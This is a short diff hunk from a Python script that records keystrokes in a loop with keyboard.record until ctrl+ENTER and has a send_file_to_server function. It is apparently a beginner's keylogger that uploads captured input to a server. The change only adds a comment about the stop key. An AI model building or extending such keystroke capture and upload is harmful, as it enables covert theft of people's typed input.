@@ -21,7 +21,7 @@ def send_file_to_server(server_url, fichier_source):
 #I did'nt have a file with just a letter per line
 #Maybe you can do better. i am a noob 
 while  COMPTEUR <= number_of_files:
-    keys = keyboard.record(until ='ctrl+ENTER')
+    keys = keyboard.record(until ='ctrl+ENTER') # ctrl+ENTER choosed to stop the record, you can put what you want instead
     chain = ''
     for key in keys: 
         if key.event_type == 'down':
